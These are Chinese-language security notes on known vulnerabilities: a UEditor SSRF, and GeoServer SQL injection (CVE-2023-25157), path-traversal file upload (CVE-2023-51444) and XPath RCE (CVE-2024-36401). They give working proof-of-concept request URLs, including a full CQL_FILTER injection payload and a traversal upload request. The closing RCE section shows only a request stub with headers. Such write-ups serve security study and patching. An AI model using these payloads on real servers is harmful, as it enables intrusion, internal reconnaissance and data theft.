# SSRF

该漏洞存在于1.4.3的JSP版本中

触发点为controller.jsp?action=catchimage或controller.php?action=catchimage，当通过source[]参数传入外部URL时，后端未对目标IP进行严格的内网私有IP限制，所以攻击者可以传入内网的IP和端口，利用UEditor所在的服务器作为跳板对内网其他机器进行端口扫描或信息探测

/ueditor/jsp/getRemoteImage.jsp?upfile=http://127.0.0.1/favicon.ico?.jpg

/ueditor/jsp/controller.jsp?action=catchimage&source[]=https://www.baidu.com/img/baidu_jgylogo3.gif

/ueditor/php/controller.php?action=catchimage&source[]=https://www.baidu.com/img/baidu_jgylogo3.gif

这里可以根据页面返回的结果不同，来判断改地址对应的主机端口是否开放，可以总结为：

  • 如果住区不存在的图片地址时，页面返{“state”: “SUCCESS”, list: [{“state”:"\u8fdc\u7a0b\u8fde\u63a5\u51fa\u9519"} ]}，即state为“远程连接出错”
  • 如果成功抓取到图片，页面返回{“state”: “SUCCESS”, list: [{“state”: “SUCCESS”,“size”:“5103”,“source”:“http://192.168.135.133:8080/tomcat.png”,“title”:“1527173588127099881.png”,“url”:"/ueditor/jsp/upload/image/20180524/1527173588127099881.png"} ]}，即state为“SUCCESS”
  • 如果主机无法访问，页面返回{“state”:“SUCCESS”, list: [{“state”: “\u6293\u53d6\u8fdc\u7a0b\u56fe\u7247\u5931\u8d25”}]}，即state为"抓取远程图片失败"

# OGC Filter SQL注入 CVE-2023-25157

影响范围为：

GeoServer < 2.18.7
2.19.0 <= GeoServer < 2.19.7
2.20.0 <= GeoServer < 2.20.7
2.21.0 <= GeoServer < 2.21.4
2.22.0 <= GeoServer < 2.22.2

利用GeoServer可以方便的发布地图数据，允许用户对特征数据进行更新、删除、插入操作，在版本2.22.1和2.21.4及以前，多个OGC表达式中均存在SQL注入漏洞

GeoServer支持使用OGC标准规范（如CQL/ECQL表达式或OGC XML Filter）对空间特征数据进行查询过滤，不过在漏洞版本中存在以下缺陷：

  • 解析过程中的缺陷：GeoServer在将客户端发起的OGC过滤请求（例如CQL_FILTER或XML Filter）转换成数据库适用的SQL语句时，未对某些特定的函数或表达式参数进行严格的清洗与参数化转义
  • 拼接SQL：在处理特定的空间运算函数（如PropertyIsLike、strStartsWith、featureid等）或特殊类型的空间过滤器时，GeoServer直接将用户输入的字符串拼接到SQL查询语句中
  • 攻击者可以通过构造含有单引号和SQL关键字的攻击载荷闭合原本的查询语句从而实现插入恶意SQL指令

注：该漏洞的使用需要确定目标服务器中是否存在类型是PostGIS的数据空间（datastore）和工作空间（workspace）,所以需要先去寻找一些参数：

Workspace name
Data store name
Feature type(table) name
One of attribute from feature type

  1. 获取可用要素名称（typeName）：

    在GeoServer中，数据以”层“为单位组织，而typeName的格式通常是Workspace name:Data Store name，可以通过下面的接口获取：

    /geoserver/ows?service=WFS&VERSION=1.0.0&request=GetCapabilities

    在返回的XML内容中搜索<FeatureType>标签，其下的子标签<Name>的值就是需要的typeName

  2. 每个可用要素的可用属性

    由于需要知道要操作的具体是哪个数据表的那个字段，所以在后面的poc中使用了strStartsWith函数，因此目标字段需要是字符串类型，利用上一步得到的typeName发送一个GetFeature请求并限制只返回一条记录，但这一步有两个方法以应对不同状况：

    # 通过查数据的方式查找
/geoserver/ows?service=wfs&version=1.0.0&request=GetFeature&typeName=<typeName>&maxFeatures=1&outputFormat=json
# 该方法需要找到features/properties下面的key，其缺陷在于如果数据为空，那么features/properties下就是空的，连字段名都不会显示

# 通过表结构进行查找，该方法直接查询表结构，直接返回的是表的结构
/geoserver/ows?service=wfs&version=1.0.0&request=DescribeFeatureType&typeName=<typeName>
# 这里我们需要的就是返回值中的<xsd:element>标签中的name键的值，之前提到后面的poc会使用strStartsWith，所以需要找到type="xsd:string"字段

  3. sql注入

    利用前面得到的参数，发送如下URL即可触发 SQL注入漏洞查询数据库版本信息：

    /geoserver/ows?service=wfs&version=1.0.0&request=GetFeature&typeName=<typeName>&CQL_FILTER=strStartsWith%28<propertiesKey>%2C%27x%27%27%29+%3D+true+and+1%3D%28SELECT+CAST+%28%28SELECT+version()%29+AS+integer%29%29+--+%27%29+%3D+true

# 文件上传漏洞 CVE-2023-51444

影响范围为GeoServer < 2.23.4；2.24.0 <= GeoServer < 2.24.1

该漏洞存在于GeoServer的REST Coverage Store API模块中，允许攻击者利用路径便利缺陷将任意文件写入到服务器的任意位置。

GeoServer的REST接口允许用户上传数据（如ZIP压缩包）来配制和管理栅格数据存储（Coverage Stores），当GeoServer使用相对路径配置存储时，系统会调用具备路径遍历防护机制的Resource接口实现，能够成功拦截包含../的恶意路径。当系统使用绝对路径配置存储时，GeoServer会调用另一个不同的代码实现，而该实现完全没有执行路径遍历安全验证，攻击者可以在REST API请求参数（如filename）中注入../../../../../../目录跳转绕过限制，将恶意文件写入服务器上的任意目录

poc：

POST /geoserver/rest/workspaces/<WORKSPACE_NAME>/coveragestores/<WAREHOUSE_NAME>/file.geotiff?filename=../../../ROOT/1.txt HTTP/1.1
Host: X
Connection: close

# XPath RCE CVE-2024-36401

影响范围为GeoServer < 2.23.6；2.24.0 <= GeoServer < 2.24.4；2.25.0 <= GeoServer < 2.25.2

该漏洞是GeoServer及底层的GeoTools库存在的一个未经身份验证的代码执行漏洞，该漏洞的核心问题在于GeoServer对XPath表达式的不安全解析机制，导致攻击者可以通过反射调用Java的底层类方法进而执行任意系统命令

GeoServer在处理OGC标准的请求时，允许客户端通过特定参数（如propertyName）来查询或过滤复杂的地理特征参数，为了解析这些属性名，GeoServer引入了XPath表达式支持。

  • GeoServer底层使用Apache Commons JXPath库来执行XPath计算
  • JXPath库在设计时包含了一个特性：允许在XPath表达式中通过扩展函数来实例化Java类并调用其方法（例如反射调用java.lang.Runtime）

该漏洞的攻击面非常广，因为多个标准的OGC服务接口都支持属性名称参数解析，未经身份验证的远程攻击者可以通过构造恶意的GET和POST请求，向以下任意一个受影响的接口发送Payload即可触发RCE：

WFS:GetFeature、GetPropertyValue
WMS:GetMap、GetFeatureInfo、GetLegendGraphic
WPS:Execute请求

POST /geoserver/ows HTTP/1.1

Accept:*/*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors

Accept-Encoding: gzip, deflate
